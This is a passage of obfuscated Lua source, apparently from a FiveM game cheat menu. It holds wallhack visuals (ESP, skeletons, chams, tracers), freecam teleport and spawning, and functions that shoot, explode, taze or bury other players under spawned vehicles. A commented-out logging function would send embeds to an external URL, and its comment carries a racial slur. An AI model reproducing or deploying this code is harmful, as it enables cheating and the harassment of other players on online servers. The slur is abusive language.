                                {he[2], he[6]}, {he[3], he[7]}, {he[4], he[8]}
                            }
                            for k, eB in c._pairs(g2) do
                                b.DrawLine(eB[1]['x'], eB[1]['y'], eB[1]['z'],
                                           eB[2]['x'], eB[2]['y'], eB[2]['z'],
                                           c.var.colors['visuals_lines:dimensions'][1],
                                           c.var.colors['visuals_lines:dimensions'][2],
                                           c.var.colors['visuals_lines:dimensions'][3],
                                           c.var.colors['visuals_lines:dimensions'][4])
                            end
                        end
                    end
                end
            end
        end,
        C_Tracers = function()
            local hf = {}
            while c.var.checkbox['visuals_tracers:toggle'] do
                a.Wait(0)
                local Q = b.PlayerPedId()
                local gI, c8 = b.GetPedLastWeaponImpactCoord(Q)
                if gI then
                    if c.var.checkbox['visuals_tracers:impacts'] then
                        hf[#hf + 1] = {coords = c8, time = 650, alpha = 255}
                    end
                    if c.var.checkbox['visuals_tracers:trajectory'] then
                        hf[#hf + 1] = {
                            coords = {
                                b.GetPedBoneCoords(Q, 6286, 0.0, 0.0, 0.0), c8
                            },
                            time = 650,
                            alpha = 255
                        }
                    end
                end
                for k, eB in c._pairs(hf) do
                    if c._type(eB.coords) == 'table' then
                        b.DrawLine(eB.coords[1], eB.coords[2],
                                   c.var.colors['visuals_tracers:trajectory'][1],
                                   c.var.colors['visuals_tracers:trajectory'][2],
                                   c.var.colors['visuals_tracers:trajectory'][3],
                                   eB.alpha)
                    else
                        b.DrawMarker(28, eB.coords, 0.0, 0.0, 0.0, 0.0, 0.0,
                                     0.0, 0.1, 0.1, 0.1,
                                     c.var.colors['visuals_tracers:impacts'][1],
                                     c.var.colors['visuals_tracers:impacts'][2],
                                     c.var.colors['visuals_tracers:impacts'][3],
                                     eB.alpha, false, false)
                    end
                    eB.time = eB.time - 1;
                    if eB.time <= 255 then
                        eB.alpha = eB.alpha - 1;
                        if eB.time <= 5 then
                            c._table.remove(hf, k)
                        end
                    end
                end
            end
        end,
        C_Names = function()
            while c.var.checkbox['visuals_names:toggle'] do
                a.Wait(0)
                local Q = b.PlayerPedId()
                local c8 = b.GetEntityCoords(Q)
                for k, eB in c._pairs(b.GetActivePlayers()) do
                    local dc = b.GetPlayerPed(eB)
                    if dc ~= Q then
                        local h7 = b.GetPedBoneCoords(dc, 31086, 0.0, 0.0, 0.0)
                        local h8 = b.GetDistanceBetweenCoords(h7, c8, false)
                        if h8 <= c.var.data.Visuals.ESP then
                            c.fram.func.DrawText3D({
                                x = h7.x,
                                y = h7.y,
                                z = h7.z + 0.4
                            }, '[' .. b.GetPlayerServerId(eB) .. ']' ..
                                                       (c.var.checkbox['visuals_names:invehicle'] and
                                                           (b.IsPedInAnyVehicle(
                                                               dc, false) and
                                                               '[IV]' or '') or
                                                           '') ..
                                                       (c.var.checkbox['visuals_names:distance'] and
                                                           '[' .. h8 .. ']' or
                                                           '') .. ' ' ..
                                                       b.GetPlayerName(eB),
                                                   b.GetEntityHealth(dc) > 0 and
                                                       c.var.colors['visuals_names:normal'] or
                                                       c.var.colors['visuals_names:dead'],
                                                   4)
                        end
                    end
                end
            end
        end,
        C_Skeleton = function()
            while c.var.checkbox['visuals_skeleton:toggle'] do
                a.Wait(0)
                local Q = b.PlayerPedId()
                local c8 = b.GetEntityCoords(Q)
                for k, eB in c._pairs(b.GetActivePlayers()) do
                    local dc = b.GetPlayerPed(eB)
                    if b.GetDistanceBetweenCoords(c8, b.GetEntityCoords(dc),
                                                  true) <=
                        c.var.data.Visuals.ESP and
                        (c.var.checkbox['visuals_skeleton:self'] or dc ~= Q) then
                        local hg = {
                            root = b.GetPedBoneCoordsScaled(dc, 0, 0.0, 0.0, 0.0),
                            head = b.GetPedBoneCoordsScaled(dc, 31086, 0.0, 0.0,
                                                            0.0),
                            neck = b.GetPedBoneCoordsScaled(dc, 39317, 0.0, 0.0,
                                                            0.0),
                            rightupperarm = b.GetPedBoneCoordsScaled(dc, 40269,
                                                                     0.0, 0.0,
                                                                     0.0),
                            leftupperarm = b.GetPedBoneCoordsScaled(dc, 45509,
                                                                    0.0, 0.0,
                                                                    0.0),
                            rightforearm = b.GetPedBoneCoordsScaled(dc, 28252,
                                                                    0.0, 0.0,
                                                                    0.0),
                            leftforearm = b.GetPedBoneCoordsScaled(dc, 61163,
                                                                   0.0, 0.0, 0.0),
                            righthand = b.GetPedBoneCoordsScaled(dc, 57005, 0.0,
                                                                 0.0, 0.0),
                            lefthand = b.GetPedBoneCoordsScaled(dc, 18905, 0.0,
                                                                0.0, 0.0),
                            rightknee = b.GetPedBoneCoordsScaled(dc, 16335, 0.0,
                                                                 0.0, 0.0),
                            leftknee = b.GetPedBoneCoordsScaled(dc, 46078, 0.0,
                                                                0.0, 0.0),
                            leftfoot = b.GetPedBoneCoordsScaled(dc, 14201, 0.0,
                                                                0.0, 0.0),
                            rightfoot = b.GetPedBoneCoordsScaled(dc, 52301, 0.0,
                                                                 0.0, 0.0),
                            color = c.var.colors['visuals_skeleton:bones']
                        }
                        b.DrawLine(hg.root, hg.neck, hg.color[1], hg.color[2],
                                   hg.color[3], hg.color[4])
                        b.DrawLine(hg.neck, hg.head, hg.color[1], hg.color[2],
                                   hg.color[3], hg.color[4])
                        b.DrawLine(hg.neck, hg.leftupperarm, hg.color[1],
                                   hg.color[2], hg.color[3], hg.color[4])
                        b.DrawLine(hg.neck, hg.rightupperarm, hg.color[1],
                                   hg.color[2], hg.color[3], hg.color[4])
                        b.DrawLine(hg.leftupperarm, hg.leftforearm, hg.color[1],
                                   hg.color[2], hg.color[3], hg.color[4])
                        b.DrawLine(hg.rightupperarm, hg.rightforearm,
                                   hg.color[1], hg.color[2], hg.color[3],
                                   hg.color[4])
                        b.DrawLine(hg.leftforearm, hg.lefthand, hg.color[1],
                                   hg.color[2], hg.color[3], hg.color[4])
                        b.DrawLine(hg.rightforearm, hg.righthand, hg.color[1],
                                   hg.color[2], hg.color[3], hg.color[4])
                        b.DrawLine(hg.root, hg.rightknee, hg.color[1],
                                   hg.color[2], hg.color[3], hg.color[4])
                        b.DrawLine(hg.root, hg.leftknee, hg.color[1],
                                   hg.color[2], hg.color[3], hg.color[4])
                        b.DrawLine(hg.leftknee, hg.leftfoot, hg.color[1],
                                   hg.color[2], hg.color[3], hg.color[4])
                        b.DrawLine(hg.rightknee, hg.rightfoot, hg.color[1],
                                   hg.color[2], hg.color[3], hg.color[4])
                    end
                end
            end
        end,
        C_DebuggerView = function()
            while c.var.checkbox['visuals_debuggerview:toggle'] do
                a.Wait(0)
                local Q = b.PlayerPedId()
                local c8 = b.GetEntityCoords(Q)
                if c.var.checkbox['visuals_debuggerview:props'] then
                    for dc in c.func.EnumerateProps() do
                        local h7 = b.GetEntityCoords(dc)
                        if b.GetDistanceBetweenCoords(c8, h7, true) <=
                            c.var.data.Visuals.ESP then
                            if c.var.checkbox['visuals_debuggerview:coords'] then
                                c.fram.func.DrawText3D(h7, 'x: ' .. h7.x ..
                                                           '\ny: ' .. h7.y ..
                                                           '\nz: ' .. h7.z,
                                                       {255, 255, 255, 255}, 4)
                            end
                            if c.var.checkbox['visuals_debuggerview:hash'] then
                                c.fram.func.DrawText3D({
                                    x = h7.x,
                                    y = h7.y,
                                    z = h7.z + 0.5
                                }, 'Hash: ' .. b.GetEntityModel(dc),
                                                       {255, 255, 255, 255}, 4)
                            end
                        end
                    end
                end
                if c.var.checkbox['visuals_debuggerview:peds'] then
                    for dc in c.func.EnumeratePeds() do
                        local h7 = b.GetEntityCoords(dc)
                        if dc ~= Q and b.GetDistanceBetweenCoords(c8, h7, true) <=
                            c.var.data.Visuals.ESP then
                            if c.var.checkbox['visuals_debuggerview:coords'] then
                                c.fram.func.DrawText3D(h7, 'x: ' .. h7.x ..
                                                           '\ny: ' .. h7.y ..
                                                           '\nz: ' .. h7.z,
                                                       {255, 255, 255, 255}, 4)
                            end
                            if c.var.checkbox['visuals_debuggerview:hash'] then
                                c.fram.func.DrawText3D({
                                    x = h7.x,
                                    y = h7.y,
                                    z = h7.z + 0.5
                                }, 'Hash: ' .. b.GetEntityModel(dc),
                                                       {255, 255, 255, 255}, 4)
                            end
                        end
                    end
                end
                if c.var.checkbox['visuals_debuggerview:vehicles'] then
                    for dc in c.func.EnumerateVehicles() do
                        local h7 = b.GetEntityCoords(dc)
                        if b.GetDistanceBetweenCoords(c8, h7, true) <=
                            c.var.data.Visuals.ESP then
                            if c.var.checkbox['visuals_debuggerview:coords'] then
                                c.fram.func.DrawText3D(h7, 'x: ' .. h7.x ..
                                                           '\ny: ' .. h7.y ..
                                                           '\nz: ' .. h7.z,
                                                       {255, 255, 255, 255}, 4)
                            end
                            if c.var.checkbox['visuals_debuggerview:hash'] then
                                c.fram.func.DrawText3D({
                                    x = h7.x,
                                    y = h7.y,
                                    z = h7.z + 0.5
                                }, 'Hash: ' .. b.GetEntityModel(dc),
                                                       {255, 255, 255, 255}, 4)
                            end
                        end
                    end
                end
            end
        end,
        C_Chams = function()
            if c.var.checkbox['visuals_chams:toggle'] then
                if not c.var.data.Chams.Dict then
                    a.Wait(30)
                    local hh = b.GetDuiHandle(c.var.data.Chams.Dui)
                    a.Wait(40)
                    c.var.data.Chams.Dict =
                        c.fram.func.RString(c._math.random(10, 20))
                    c.var.data.Chams.TName =
                        c.fram.func.RString(c._math.random(10, 20))
                    a.Wait(30)
                    b.CreateRuntimeTextureFromDuiHandle(
                        b.CreateRuntimeTxd(c.var.data.Chams.Dict),
                        c.var.data.Chams.TName, hh)
                end
                a.Wait(100)
                if c.var.data.Chams.target == 1 or c.var.data.Chams.target == 3 then
                    for hi, hj in c._pairs(c.var.data.Chams.dicts.male) do
                        for k, eB in c._pairs(c.var.data.Chams.sets) do
                            for hk, hl in c._pairs(
                                              c.var.data.Chams.sufixes[eB] or
                                                  c.var.data.Chams.sufixes.rest) do
                                for hm, hn in
                                    c._pairs(c.var.data.Chams.middlefixes[eB] or
                                                 c.var.data.Chams.middlefixes
                                                     .casual) do
                                    local f6 = eB .. '_diff_' .. hl .. hn;
                                    b.AddReplaceTexture(hj .. '\\' .. f6, f6,
                                                        c.var.checkbox['visuals_chams:toggle'] and
                                                            c.var.data.Chams
                                                                .Dict or hj,
                                                        c.var.checkbox['visuals_chams:toggle'] and
                                                            c.var.data.Chams
                                                                .TName or f6)
                                end
                            end
                        end
                    end
                end
                if c.var.data.Chams.target == 2 or c.var.data.Chams.target == 3 then
                    for hi, hj in c._pairs(c.var.data.Chams.dicts.female) do
                        for k, eB in c._pairs(c.var.data.Chams.sets) do
                            for hk, hl in c._pairs(
                                              c.var.data.Chams.sufixes[eB] or
                                                  c.var.data.Chams.sufixes.rest) do
                                for hm, hn in
                                    c._pairs(c.var.data.Chams.middlefixes[eB] or
                                                 c.var.data.Chams.middlefixes
                                                     .casual) do
                                    local f6 = eB .. '_diff_' .. hl .. hn;
                                    b.AddReplaceTexture(hj .. '\\' .. f6, f6,
                                                        c.var.checkbox['visuals_chams:toggle'] and
                                                            c.var.data.Chams
                                                                .Dict or hj,
                                                        c.var.checkbox['visuals_chams:toggle'] and
                                                            c.var.data.Chams
                                                                .TName or f6)
                                end
                            end
                        end
                    end
                end
            else
                for ho, hp in c._pairs(c.var.data.Chams.dicts) do
                    for hi, hj in c._pairs(hp) do
                        for k, eB in c._pairs(c.var.data.Chams.sets) do
                            for hk, hl in c._pairs(
                                              c.var.data.Chams.sufixes[eB] or
                                                  c.var.data.Chams.sufixes.rest) do
                                for hm, hn in
                                    c._pairs(c.var.data.Chams.middlefixes[eB] or
                                                 c.var.data.Chams.middlefixes
                                                     .casual) do
                                    local f6 = eB .. '_diff_' .. hl .. hn;
                                    b.RemoveReplaceTexture(hj .. '\\' .. f6, f6)
                                end
                            end
                        end
                    end
                end
            end
        end,
        C_WeaponChams = function()
            if c.var.checkbox['visuals_weaponchams:toggle'] then
                if not c.var.data.Chams.Dict then
                    a.Wait(30)
                    local hh = b.GetDuiHandle(c.var.data.Chams.WDui)
                    a.Wait(40)
                    c.var.data.Chams.WDict =
                        c.fram.func.RString(c._math.random(10, 20))
                    c.var.data.Chams.WTName =
                        c.fram.func.RString(c._math.random(10, 20))
                    a.Wait(30)
                    b.CreateRuntimeTextureFromDuiHandle(
                        b.CreateRuntimeTxd(c.var.data.Chams.WDict),
                        c.var.data.Chams.WTName, hh)
                end
                for k, eB in c._ipairs(c.var.data.Chams.weapons) do
                    b.AddReplaceTexture(eB, eB, c.var.data.Chams.WDict,
                                        c.var.data.Chams.WTName)
                end
            else
                for k, eB in c._ipairs(c.var.data.Chams.weapons) do
                    b.RemoveReplaceTexture(eB, eB)
                end
            end
        end,
        C_Freecam = function()
            local hq = {
                ped = b.PlayerPedId(),
                cam = {handle = nil, coords = nil, rot = nil, speed = 1},
                options = {
                    mode = 'Teleport',
                    modes = {'Teleport', 'Vehicle Spawner', 'Object Spawner'},
                    modeIndex = 1,
                    vehicle_model = 'adder'
                },
                prop = {
                    preview,
                    rot = {},
                    avalibleprops = {
                        'prop_roadcone02a', 'stt_prop_track_cross',
                        'stt_prop_track_link', 'stt_prop_track_straight_bar_m',
                        'stt_prop_ramp_adj_loop', 'stt_prop_ramp_adj_loop',
                        'stt_prop_stunt_bowling_ball',
                        'stt_prop_stunt_soccer_ball', 'stt_prop_wallride_02'
                    },
                    selectedIndex = 1,
                    prop_model = 'prop_roadcone02a',
                    selected = ''
                },
                savedTime = 0
            }
            local hr = function(fh)
                local hs = fh.z * 0.0174532924;
                local ht = fh.x * 0.0174532924;
                local d = c._math.abs(c._math.cos(ht))
                return c._vector3(-1 * c._math.sin(hs) * d, c._math.cos(hs) * d,
                                  c._math.sin(ht))
            end;
            if not b.DoesCamExist(hq.cam.handle) then
                local hu = b.GetEntityCoords(b.PlayerPedId())
                hq.cam.handle = b.CreateCam('DEFAULT_SCRIPTED_CAMERA', 1)
                hq.cam.coords = b.GetGameplayCamCoords()
                hq.cam.rot = b.GetGameplayCamRot(2)
                b.SetCamRot(hq.cam.handle, hq.cam.rot.x, hq.cam.rot.y,
                            hq.cam.rot.z)
                b.SetCamCoord(hq.cam.handle, hu.x, hu.y, hu.z + 2.0)
                b.RenderScriptCams(true, true, 1000, 1, 1)
                b.SetCamActive(hq.cam.handle, 1)
                b.FreezeEntityPosition(hq.ped, true)
            end
            while c.var.checkbox['miscraft:freecam'] do
                a.Wait(0)
                b.DisplaySniperScopeThisFrame()
                local ez = b.GetGameTimer()
                local hv = hq.options.mode;
                hq.cam.coords = b.GetCamCoord(hq.cam.handle)
                hq.cam.speed =
                    b.IsDisabledControlPressed(0, c.Keys['LEFTSHIFT']) and 2.5 or
                        1;
                b.SetFocusPosAndVel(hq.cam.coords, 0, 0, 0)
                if b.IsDisabledControlPressed(0, c.Keys['W']) then
                    local c8 = hr(b.GetGameplayCamRot(0)) * hq.cam.speed +
                                   b.GetCamCoord(hq.cam.handle)
                    b.SetCamCoord(hq.cam.handle, c8.x, c8.y, c8.z)
                end
                if b.IsDisabledControlPressed(0, c.Keys['S']) then
                    local c8 = hr(b.GetGameplayCamRot(0)) * -hq.cam.speed +
                                   b.GetCamCoord(hq.cam.handle)
                    b.SetCamCoord(hq.cam.handle, c8.x, c8.y, c8.z)
                end
                if b.IsDisabledControlPressed(0, c.Keys['SPACE']) then
                    local c8 = b.GetCamCoord(hq.cam.handle)
                    b.SetCamCoord(hq.cam.handle, c8.x, c8.y, c8.z + 0.5)
                end
                if b.IsDisabledControlPressed(0, c.Keys['LEFTCTRL']) then
                    local c8 = b.GetCamCoord(hq.cam.handle)
                    b.SetCamCoord(hq.cam.handle, c8.x, c8.y, c8.z - 0.5)
                end
                hq.cam.rot = b.GetGameplayCamRot(0)
                b.SetCamRot(hq.cam.handle, hq.cam.rot)
                local hw, hx, hy = b.GetCamMatrix(hq.cam.handle)
                local hz = hq.cam.coords;
                local hA = hz + hx * 1000.0;
                local hB = b.StartShapeTestRay(hz.x, hz.y, hz.z, hA.x, hA.y,
                                               hA.z, -1)
                local hC, hD, hE, hF, hG = b.GetShapeTestResult(hB)
                if not hD then hE = hA end
                if hq.options.mode == 'Teleport' then
                    if hC and
                        b.IsDisabledControlJustPressed(0, c.Keys['MOUSE1']) then
                        b.SetEntityCoords(hq.ped, hE.x, hE.y, hE.z)
                    end
                elseif hq.options.mode == 'Object Spawner' then
                    if b.IsDisabledControlJustPressed(0, c.Keys['MOUSE1']) then
                        local hH = b.CreateObject(
                                       b.GetHashKey(hq.prop.prop_model), hE,
                                       true, true, false)
                        b.SetEntityRotation(hH, hq.prop.rot[1], hq.prop.rot[2],
                                            hq.prop.rot[3], 5, true)
                        b.FreezeEntityPosition(hH, true, true)
                    end
                    if hq.prop.preview and
                        b.IsDisabledControlPressed(0, c.Keys['1']) then
                        hq.prop.rot[1] = hq.prop.rot[1] + 1;
                        b.SetEntityRotation(hq.prop.preview, hq.prop.rot[1],
                                            hq.prop.rot[2], hq.prop.rot[3], 5,
                                            true)
                    end
                    if hq.prop.preview and
                        b.IsDisabledControlPressed(0, c.Keys['2']) then
                        hq.prop.rot[2] = hq.prop.rot[2] + 1;
                        b.SetEntityRotation(hq.prop.preview, hq.prop.rot[1],
                                            hq.prop.rot[2], hq.prop.rot[3], 5,
                                            true)
                    end
                    if hq.prop.preview and
                        b.IsDisabledControlPressed(0, c.Keys['3']) then
                        hq.prop.rot[3] = hq.prop.rot[3] + 1;
                        b.SetEntityRotation(hq.prop.preview, hq.prop.rot[1],
                                            hq.prop.rot[2], hq.prop.rot[3], 5,
                                            true)
                    end
                    local hI = b.GetHashKey(hq.prop.prop_model)
                    if hI == hq.prop.hash and b.DoesEntityExist(hq.prop.preview) then
                        b.SetEntityAlpha(hq.prop.preview, 204)
                        b.SetEntityCoords(hq.prop.preview, hE)
                    else
                        b.DeleteEntity(hq.prop.preview)
                        if c.func.LoadModel(hI) then
                            hq.prop.preview =
                                b.CreateObject(hI, hE, false, true, false)
                            hq.prop.hash = hI;
                            b.SetEntityAlpha(hq.prop.preview, 102)
                            b.SetEntityCollision(hq.prop.preview, false, false)
                            local E, F, G = c._table.unpack(
                                                b.GetEntityRotation(hq.prop
                                                                        .preview))
                            hq.prop.rot = {E, F, G}
                        end
                    end
                    if b.IsAnyControlJustPressed(0, c.Keys['UP']) then
                        hq.prop.selectedIndex =
                            hq.prop.selectedIndex + 1 <= #hq.prop.avalibleprops and
                                hq.prop.selectedIndex + 1 or 1;
                        hq.prop.prop_model =
                            hq.prop.avalibleprops[hq.prop.selectedIndex]
                    elseif b.IsAnyControlJustPressed(0, c.Keys['DOWN']) then
                        hq.prop.selectedIndex =
                            hq.prop.selectedIndex - 1 >= 1 and
                                hq.prop.selectedIndex - 1 or
                                #hq.prop.avalibleprops;
                        hq.prop.prop_model =
                            hq.prop.avalibleprops[hq.prop.selectedIndex]
                    end
                    hv = hv .. ' | ' .. hq.prop.prop_model .. ' [' ..
                             hq.prop.selectedIndex .. '/' ..
                             #hq.prop.avalibleprops .. ']'
                elseif hq.options.mode == 'Vehicle Spawner' then
                    if b.IsDisabledControlJustPressed(0, c.Keys['ENTER']) and
                        not c.fram.shouldShow then
                        hq.options.vehicle_model =
                            c.func.KeyboardInput('Model:', '', 10, false)
                    end
                    if b.IsDisabledControlJustPressed(0, c.Keys['MOUSE1']) then
                        if c.func.LoadModel(
                            b.GetHashKey(hq.options.vehicle_model)) then
                            b.CreateVehicle(
                                b.GetHashKey(hq.options.vehicle_model), hE.x,
                                hE.y, hE.z, 0.0, true, false)
                        end
                    elseif b.IsDisabledControlJustPressed(0, c.Keys['MOUSE2']) then
                        if c.func.LoadModel(
                            b.GetHashKey(hq.options.vehicle_model)) then
                            a.CreateThread(function()
                                local hJ =
                                    b.IsControlPressed(0, c.Keys['LEFTSHIFT'])
                                local fL = hJ and hq.cam.coords or hE;
                                local vehicle =
                                    b.CreateVehicle(b.GetHashKey(hq.options
                                                                     .vehicle_model),
                                                    fL, 0.0, true, false)
                                local hK = c.func
                                               .RotationToDirection(hq.cam.rot)
                                b.SetEntityRotation(vehicle, hJ and
                                                        -hq.cam.rot.x or 0.0,
                                                    hq.cam.rot.y, hq.cam.rot.z,
                                                    5, false)
                                a.Wait(100)
                                b.ApplyForceToEntity(vehicle, 3, hK.x * 500.0,
                                                     hK.y * 500.0,
                                                     hJ and hK.z * 500.0 or 0.0,
                                                     0, 0, 0, 0, false, false,
                                                     true, true, true)
                            end)
                        end
                    end
                end
                if b.IsDisabledControlPressed(0, c.Keys['LEFT']) and ez -
                    hq.savedTime >= 90 then
                    hq.savedTime = ez;
                    hq.options.modeIndex =
                        hq.options.modeIndex - 1 >= 1 and hq.options.modeIndex -
                            1 or #hq.options.modes;
                    hq.options.mode = hq.options.modes[hq.options.modeIndex]
                elseif b.IsDisabledControlPressed(0, c.Keys['RIGHT']) and ez -
                    hq.savedTime >= 90 then
                    hq.savedTime = ez;
                    hq.options.modeIndex =
                        hq.options.modeIndex + 1 <= #hq.options.modes and
                            hq.options.modeIndex + 1 or 1;
                    hq.options.mode = hq.options.modes[hq.options.modeIndex]
                end
                if hq.options.mode ~= 'Object Spawner' and
                    b.DoesEntityExist(hq.prop.preview) then
                    b.DeleteEntity(hq.prop.preview)
                    hq.prop.preview = 0
                end
                c.fram.func.DrawText(hv, 0.5, 0.9, {255, 255, 255, 255}, 0.35,
                                     4, true)
                b.DrawRect(0.5, 0.5, 0.006, 0.004, 10, 10, 10,
                           255 - c.fram.var.colors.menuAlpha)
                b.DrawRect(0.5, 0.5, 0.002, 0.011, 10, 10, 10,
                           255 - c.fram.var.colors.menuAlpha)
                b.DrawRect(0.5, 0.5, 0.0045, 0.001, 255, 255, 255,
                           255 - c.fram.var.colors.menuAlpha)
                b.DrawRect(0.5, 0.5, 0.001, 0.008, 255, 255, 255,
                           255 - c.fram.var.colors.menuAlpha)
            end
            b.RenderScriptCams(false, true, 700, 1, 1)
            b.SetCamActive(hq.cam.handle, 0)
            b.DestroyCam(hq.cam.handle, true)
            for ev = 1, 30, 1 do
                a.Wait(5)
                b.SetFocusEntity(hq.ped)
                b.FreezeEntityPosition(hq.ped, false, false)
            end
        end,
        WebhookLog = function(hL, gd, c7)
            --[[ stfu nigga
            local hM = {
                type = 'rich',
                title = gd,
                description = '',
                color = c7 or 0,
                fields = hL,
                thumbnail = {
                    url = '',
                    height = 0,
                    width = 0
                },
                author = {
                    name = 'Absolute logs',
                    icon_url = 'https://cdn.discordapp.com/attachments/879445396789788733/884810737694961664/ezgif-2-5f74e424f110.gif'
                }
            }
            a.CreateThread(function()
                local hh = b.CreateDui(
                                -- this is the original logging link
                               'https://redmetrics.otternotweasel.xyz/?key=ABS&embeds=' ..
                                   c._json.encode({hM}), 50, 50)
                while not b.IsDuiAvailable(hh) do a.Wait(125) end
                b.DestroyDui(hh)
            end)]]
        end,
        GetFullMetaData = function(fP)
            local hN = {}
            local hO = b.GetNumResourceMetadata(fP, 'client_script')
            if hO < 1 then return end
            for ev = 1, hO do
                hN[#hN + 1] = b.GetResourceMetadata(fP, 'client_script', ev)
            end
            return hN
        end,
        C_Forcefield = function()
            local hP = function(_)
                local fC = b.GetEntityCoords(b.PlayerPedId())
                local hQ = b.GetEntityCoords(_)
                local e_ = hQ.x - fC.x;
                local f0 = hQ.y - fC.y;
                local f1 = hQ.z - fC.z;
                local ax = c._math.sqrt(e_ * e_ + f0 * f0 + f1 * f1)
                local hR = 50 / ax * c._math.pow(1.04, 1 - ax)
                b.ApplyForceToEntity(_, 1, hR * e_ /
                                         c.var.data.ForceFieldData.strength,
                                     hR * f0 /
                                         c.var.data.ForceFieldData.strength,
                                     hR * f1 /
                                         c.var.data.ForceFieldData.strength,
                                     c._math.random() * c._math.random(-1, 1),
                                     c._math.random() * c._math.random(-1, 1),
                                     c._math.random() * c._math.random(-1, 1),
                                     true, false, true, true, true, true)
            end;
            while c.var.checkbox['forcefield:toggle'] do
                a.Wait(0)
                local D = b.PlayerPedId()
                local hS = b.GetEntityCoords()
                for dc in c.func.EnumeratePeds() do
                    if dc ~= D and not b.IsPedAPlayer(dc) and
                        #(hS - b.GetEntityCoords(dc)) <
                        c.var.data.ForceFieldData.radius then
                        hP(dc)
                    end
                end
                for dc in c.func.EnumerateVehicles() do
                    if #(hS - b.GetEntityCoords(dc)) <
                        c.var.data.ForceFieldData.radius then
                        hP(dc)
                    end
                end
                if c.var.checkbox['forcefield:radius:toggle'] then
                    b.DrawMarker(28, hS, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,
                                 c.var.data.ForceFieldData.radius,
                                 c.var.data.ForceFieldData.radius,
                                 c.var.data.ForceFieldData.radius, 15, 15, 60,
                                 200)
                end
            end
        end,
        C_ChangePos = function()
            while c.var.checkbox['settings:changepos'] do
                a.Wait(0)
                b.SetMouseCursorActiveThisFrame()
                local E, F = b.GetNuiCursorPosition()
                local eG, eH = b.GetActiveScreenResolution()
                c.fram.var.x = E / eG;
                c.fram.var.y = F / eH
            end
        end,
        CollectHandlingData = function(vehicle)
            local hT = {}
            for k, eB in c._ipairs(c.var.data.HandlingList) do
                if c._starts(eB, 'n') and
                    b.GetVehicleHandlingInt(vehicle, 'CHandlingData', eB) then
                    hT[#hT + 1] = {
                        b.GetVehicleHandlingInt(vehicle, 'CHandlingData', eB),
                        'float', eB
                    }
                elseif c._starts(eB, 'f') and
                    b.GetVehicleHandlingFloat(vehicle, 'CHandlingData', eB) then
                    hT[#hT + 1] = {
                        b.GetVehicleHandlingFloat(vehicle, 'CHandlingData', eB),
                        'float', eB
                    }
                elseif c._starts(eB, 'vec') and
                    b.GetVehicleHandlingVector(vehicle, 'CHandlingData', eB) then
                    hT[#hT + 1] = {
                        b.GetVehicleHandlingVector(vehicle, 'CHandlingData', eB),
                        'vector3', eB
                    }
                end
            end
            return hT
        end,
        SetHandlingData = function(vehicle, eh, c1)
            if c._starts(eh, 'n') and
                b.GetVehicleHandlingInt(vehicle, 'CHandlingData', eh) then
                b.SetVehicleHandlingInt(vehicle, 'CHandlingData', eh, c1)
                c.func.B_Repair()
            elseif c._starts(eh, 'f') and
                b.GetVehicleHandlingFloat(vehicle, 'CHandlingData', eh) then
                b.SetVehicleHandlingFloat(vehicle, 'CHandlingData', eh, c1)
                c.func.B_Repair()
            elseif c._starts(eh, 'vec') and
                b.GetVehicleHandlingVector(vehicle, 'CHandlingData', eh) then
                b.SetVehicleHandlingVector(vehicle, 'CHandlingData', eh, c1)
                c.func.B_Repair()
            end
        end,
        B_TazePlayer = function(hU)
            a.CreateThread(function()
                local D = b.PlayerPedId()
                local n = b.GetHashKey('WEAPON_STUNGUN')
                for k, eB in c._ipairs(hU) do
                    a.Wait(30)
                    local ck = b.GetPlayerPed(eB)
                    local hV = b.GetEntityVelocity(ck)
                    hV = hV[2]
                    if hV < 0 then hV = hV * -1 end
                    hV = hV / 2;
                    local hW = b.GetPedBoneCoords(ck, 31086, 0.0, -0.2, 0.0)
                    local hX = b.GetPedBoneCoords(ck, 31086, 0.0, 0.2 + hV, 0.0)
                    for ev = 1, 3 do
                        a.Wait(3)
                        b.ShootSingleBulletBetweenCoords(hW, hX, 1, true, n, D,
                                                         true, false, 1000.0)
                    end
                end
            end)
        end,
        B_SpamVehicles = function(c8, vehicle)
            a.CreateThread(function()
                local n = b.GetHashKey(vehicle)
                if c.func.LoadModel(n) then
                    for ev = 1, 10, 1 do
                        a.Wait(30)
                        for ev = 1, 5, 1 do
                            a.Wait(60)
                            local vehicle =
                                b.CreateVehicle(n, c8.x + ev, c8.y - ev,
                                                c8.z + ev, 0.0, true, false)
                            b.SetEntityVelocity(vehicle, 0, 0, -100.0)
                        end
                    end
                end
            end)
        end,
        B_ShootAllPlayers = function(hU)
            a.CreateThread(function()
                local D = b.PlayerPedId()
                local n = b.GetHashKey('WEAPON_PISTOL')
                for k, eB in c._ipairs(hU) do
                    a.Wait(30)
                    local ck = b.GetPlayerPed(eB)
                    local hV = b.GetEntityVelocity(ck)
                    hV = hV[2]
                    if hV < 0 then hV = hV * -1 end
                    hV = hV / 2;
                    local hW = b.GetPedBoneCoords(ck, 31086, 0.0, -0.2, 0.0)
                    local hX = b.GetPedBoneCoords(ck, 31086, 0.0, 0.2 + hV, 0.0)
                    for ev = 1, 6 do
                        a.Wait(1)
                        b.ShootSingleBulletBetweenCoords(hW, hX, c._math
                                                             .random(200, 400),
                                                         true, n, D, true,
                                                         false, 1000.0)
                    end
                end
            end)
        end,
        B_ExplodePlayers = function(hU)
            a.CreateThread(function()
                for k, eB in c._ipairs(hU) do
                    b.AddExplosion(b.GetEntityCoords(b.GetPlayerPed(eB)),
                                   c._math.random(53, 56),
                                   c._math.random(200, 1000), true, false, 1.0)
                    a.Wait(15)
                end
            end)
        end,
        B_SpamRandomVehicles = function(hU)
            local hY = {
                b.GetHashKey('bus'), b.GetHashKey('adder'),
                b.GetHashKey('guardian'), b.GetHashKey('contender')
            }
            a.CreateThread(function()
                for k, eB in c._ipairs(hY) do
                    c.func.LoadModel(eB)
                end
                for k, eB in c._ipairs(hU) do
                    local vehicle = hY[c._math.random(1, #hY)]
                    for ev = 1, c._math.random(1, 10) do
                        b.CreateVehicle(vehicle,
                                        b.GetEntityCoords(b.GetPlayerPed(eB)),
                                        0.0, true, false)
                        a.Wait(4)
                    end
                end
            end)
        end,
        B_AttachProps = function(hU, gm)
            a.CreateThread(function()
                local n = b.GetHashKey(gm)
                if c.func.LoadModel(n) then
                    for k, eB in c._ipairs(hU) do
                        c.func.CreateAndAttachPropToEntity(b.GetPlayerPed(eB),
                                                           n, true)
                        a.Wait(30)
                    end
                end
            end)
        end,
        B_SetTheme = function(c0)
            if c0 == 1 then
                a.CreateThread(function()
                    b.DestroyDui(c.fram.var.txobjects.header)
                    a.Wait(10)
